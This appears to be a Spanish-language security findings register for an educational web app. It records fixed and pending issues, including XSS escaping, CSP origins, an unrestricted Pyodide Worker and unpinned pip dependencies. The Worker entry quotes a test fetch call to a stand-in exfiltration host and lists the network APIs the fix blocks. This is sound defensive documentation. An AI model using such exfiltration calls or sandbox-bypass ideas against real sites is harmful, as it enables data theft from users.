# Registro de hallazgos de seguridad

Registro central del equipo AppSec. **Solo lo edita `security-lead`**; los especialistas le
devuelven sus hallazgos con la plantilla de abajo. Flujo y severidad: [`AGENT_WORKFLOW.md`](AGENT_WORKFLOW.md).

| Última revisión | Commit | Tipo | Responsable |
|---|---|---|---|
| 19/10/2026 | `eb187a9` (`main`) | Cierre técnico de PLD-SEC-003, 004 y 005 | security-lead |
| 19/10/2026 | `708431f` (`main`) | Línea base completa al crear el equipo | security-lead |

La siguiente revisión incremental parte de `git diff eb187a9..HEAD`.

## Resumen

| ID | Título | Severidad | Estado | Responsable |
|---|---|---|---|---|
| PLD-SEC-001 | Sin pruebas de aislamiento entre cuentas en la mayoría de rutas privadas | Informativa | Corregido | security-qa |
| PLD-SEC-002 | Atributos de la barra lateral con datos del contenido sin escapar | Baja | Corregido | frontend-security |
| PLD-SEC-003 | La CSP de producción permite `localhost:8000` en `connect-src` | Baja | Corrección preparada; falta activarla en `pages.yml` (autorización) | frontend-security |
| PLD-SEC-004 | El Worker de Pyodide no tiene CSP y podía conectar con cualquier origen | Media | Confirmado → mitigado (riesgo residual documentado) | frontend-security |
| PLD-SEC-005 | Dependencias de pip sin *hashes* ni archivo de bloqueo | Baja | Confirmado; propuesta verificada, pendiente de decisión | dependency-security |
| PLD-SEC-006 | Riesgos ya aceptados en revisiones anteriores | Baja | Aceptado | security-lead |
| PLD-SEC-FP1 | Alertas de herramientas revisadas como falsos positivos | — | Falso positivo | security-lead |

## Plantilla

```
### PLD-SEC-NNN · Título
- Severidad: … (razonamiento: explotabilidad × impacto)
- Estado: confirmado | probable | no verificable | falso positivo → abierto | en curso | corregido | aceptado
- Responsable: <agente>
- Ubicación: archivo:línea
- Evidencia reproducible: comando o test, y su resultado
- Condiciones para explotarlo:
- Impacto y alcance:
- Recomendación:
- Prueba de regresión:
```

## Hallazgos

### PLD-SEC-001 · Sin pruebas de aislamiento entre cuentas en la mayoría de rutas privadas
- **Severidad**: Informativa. No es una vulnerabilidad: el código filtra por `user.id` en todas las
  rutas. Es un hueco de pruebas: un cambio futuro podría introducir un IDOR sin que falle ningún test.
- **Estado**: confirmado → **corregido**.
- **Responsable**: security-qa.
- **Ubicación**: `backend/tests/`. Solo `test_dashboard.py:129` y los tests de A2A probaban dos usuarios.
- **Evidencia**: `grep` de pruebas con dos cuentas en `backend/tests/` (19/10/2026).
- **Corrección**: `backend/tests/test_security_isolation.py`: dos usuarios; B intenta leer, sobrescribir
  y borrar los datos de A en progreso, intentos, estados de curso, PCAP, cuenta, exportación y
  actividad, también con `user_id`/email en la petición; borrar la cuenta de B no toca filas de A;
  las rutas privadas exigen sesión.
- **Prueba de regresión**: `cd backend && python -m pytest -q tests/test_security_isolation.py` → 4 pasan.

### PLD-SEC-002 · Atributos de la barra lateral con datos del contenido sin escapar
- **Severidad**: Baja. El dato sale de `frontend/data/lessons.json`, que solo cambia con un commit
  al repositorio; no lo controla el alumno ni la API.
- **Estado**: confirmado → **corregido** en la rama del PR #50.
- **Responsable**: frontend-security + security-qa.
- **Ubicación**: `frontend/js/app.js` en `renderSidebar()`.
- **Condiciones**: un slug con comillas en el JSON (error de contenido o commit malicioso).
- **Impacto**: XSS almacenado en la web publicada para todos los visitantes; requiere acceso de escritura al repositorio.
- **Corrección**: `escapeHtml()` en `data-module`, `href` y `data-slug` (`frontend/js/app.js`, `renderSidebar()`); validación de slugs con `^[a-z0-9-]+$` en `backend/tests/test_content.py`.
- **Prueba de regresión**: `test_module_and_lesson_slugs_are_safe_for_html_attributes_and_routes` (`cd backend && python -m pytest -q tests/test_content.py`).

### PLD-SEC-003 · La CSP de producción permite `localhost:8000` en `connect-src`
- **Severidad**: Baja. Sin un XSS previo no tiene efecto.
- **Estado**: confirmado → **corrección preparada**, sin activar en la web publicada.
- **Responsable**: frontend-security.
- **Ubicación**: `frontend/index.html:8`. Es la única página con esos orígenes: `404.html`,
  `privacidad.html` y `aviso-legal.html` solo tienen `connect-src 'self'`.
- **Por qué existen**: GitHub Pages solo sirve archivos, así que la misma CSP vale en producción y en
  desarrollo. En desarrollo y en los e2e la web se sirve en `localhost:5500` y llama a la API en
  `127.0.0.1:8000` (`frontend/js/api.js:6`, `playwright.config.js`, `README.md:137`). El modo local de
  un solo puerto (`scripts/run_local.py`, `backend/app/local_site.py`) no los necesita: usa `'self'`.
- **Evidencia**: `python scripts/security/production_csp.py --check frontend` → quita 44 caracteres,
  exactamente los dos orígenes.
- **Impacto**: con un XSS, la página publicada podría hablar con un servicio local en el puerto 8000 del visitante.
- **Corrección**: `scripts/security/production_csp.py` quita los dos orígenes de la copia que se
  publica y falla si queda algún origen `http:`; el repositorio y el desarrollo no cambian.
  **Falta activarla**: un paso en `.github/workflows/pages.yml` (ver `REMEDIATION_PLAN.md`), que
  cambia la web publicada y necesita la autorización de la persona.
- **Prueba de regresión**: `backend/tests/test_production_csp.py` (4 tests): solo cambian esos dos
  orígenes, el resto de directivas y de la página quedan igual, y se rechazan orígenes `http:`.

### PLD-SEC-004 · El Worker de Pyodide no tiene CSP y podía conectar con cualquier origen
- **Severidad**: Media. Requiere que la persona ejecute código preparado por otro (por ejemplo,
  pegado de un foro), pero ese código podía enviar a cualquier servidor lo que escribiera en la
  consola o lo que obtuviera desde el Worker. La CSP que el proyecto daba por buena no se aplicaba allí.
- **Estado**: **confirmado** experimentalmente → **mitigado**.
- **Responsable**: frontend-security + security-qa.
- **Ubicación**: `frontend/js/pyodide-worker.js` (Worker de módulo creado desde
  `frontend/js/python-runner.js:34` con una URL del mismo origen).
- **Evidencia** (Chromium de Playwright, 19/10/2026): desde la página, `fetch("https://exfil.example/…")`
  lo bloquea la CSP; desde Python en la consola, `js.XMLHttpRequest` y `js.fetch` hacia el mismo
  origen **llegaban** (estado 200). La CSP en `<meta>` no se hereda en un Worker cargado desde una URL;
  ese Worker solo tendría CSP con una cabecera HTTP, y GitHub Pages no permite cabeceras.
- **Corrección**: tras cargar Python, el Worker sustituye por funciones que fallan `fetch`,
  `XMLHttpRequest`, `WebSocket`, `WebSocketStream`, `EventSource`, `WebTransport`, `Worker`,
  `SharedWorker`, `importScripts` y `caches`, además de `eval` y los constructores de funciones
  (con ellos se podía escribir `import("https://…")`, que no se puede sustituir). El alumno no necesita
  red: no hay paquetes que descargar después de cargar Python.
- **Prueba de regresión**: `e2e/security.spec.js`, «el código Python del alumno no puede enviar datos a
  otros servidores»: falla sin la corrección (comprobado) y pasa con ella. Suite e2e completa: 123 en verde.
- **Riesgo residual**: es defensa en profundidad dentro del mismo JavaScript, no una frontera del
  navegador: una técnica que no se haya previsto podría saltarla. Solo se ha probado en Chromium. La
  barrera completa sería una CSP propia del Worker: crearlo desde una URL `blob:` (que sí hereda la CSP
  de la página) exige añadir `blob:` a `worker-src`; es un cambio de CSP que necesita autorización.
  El Worker conserva acceso a IndexedDB del sitio (la web no lo usa para datos personales).

### PLD-SEC-005 · Dependencias de pip sin *hashes* ni archivo de bloqueo
- **Severidad**: Baja. Casi todos los rangos tienen límite superior; `pip-audit` en CI y Dependabot.
- **Estado**: confirmado; propuesta comprobada, **pendiente de decisión** (cambia el despliegue).
- **Responsable**: dependency-security.
- **Ubicación**: `backend/requirements.txt` (rangos), `backend/Dockerfile:14` (`pip install -r
  requirements.txt` sin `--require-hashes`) y `backend/Dockerfile:5` (`python:3.12-slim` sin *digest*).
- **Evidencia**: `requirements.txt` declara 14 paquetes (dos sin límite superior: `python-multipart` y `argon2-cffi`); la resolución real para la imagen instala
  63 (directos y transitivos), y ninguno queda fijado: cada build de Render toma la versión más nueva
  dentro de cada rango.
- **Impacto**: una versión nueva comprometida o rota de cualquiera de los 63 entraría en la siguiente
  imagen sin pasar por la CI.
- **Propuesta verificada**: `uv pip compile backend/requirements.txt --python-version 3.12
  --python-platform x86_64-manylinux_2_28 --generate-hashes -o backend/requirements.lock` genera 63
  paquetes con 1 559 *hashes* de PyPI, y `pip install --require-hashes --only-binary=:all:` para
  Python 3.12 en Linux instala los 63 sin errores. Pasos y contrapartidas en `REMEDIATION_PLAN.md`.
- **Prueba de regresión**: un job de CI que instale con `--require-hashes` y ejecute pytest.

### PLD-SEC-006 · Riesgos ya aceptados en revisiones anteriores
Siguen vigentes y documentados en [`revision-2026-10.md`](revision-2026-10.md): `style-src 'unsafe-inline'`,
CSP en `<meta>` sin `frame-ancestors`, Pyodide desde jsDelivr sin SRI, progreso declarado por el alumno,
límites de intentos en memoria (una instancia), token de Android en `SharedPreferences` y rutas
antiguas `/api/...`. No se reabren salvo que cambie su contexto.

### PLD-SEC-FP1 · Falsos positivos revisados
| Herramienta | Ubicación | Motivo |
|---|---|---|
| Bandit B105 (baja) | `backend/app/security_events.py:31`, `:32`, `:37` | Nombres de eventos (`"auth.token_forged"`…), no contraseñas |
| Bandit B106 (baja) | `backend/app/session_cookie.py:40` | `token_type="cookie"` es el tipo de sesión, no un secreto |
| Bandit B310 (media) | `backend/app/mailer.py:87` | `urlopen` sobre `BREVO_URL`, una constante `https://`; marcado `# nosec B310` con el motivo |
| Gitleaks `generic-api-key` | `backend/tests/test_auth.py:69` | Contraseña ficticia de un test de fuerza bruta; ignorada por huella en `.gitleaksignore` |
| Semgrep `pld-token-in-web-storage` | `frontend/js/store.js:78` | Guarda la marca literal `"cookie"`, no un token; la regla ya excluye literales |
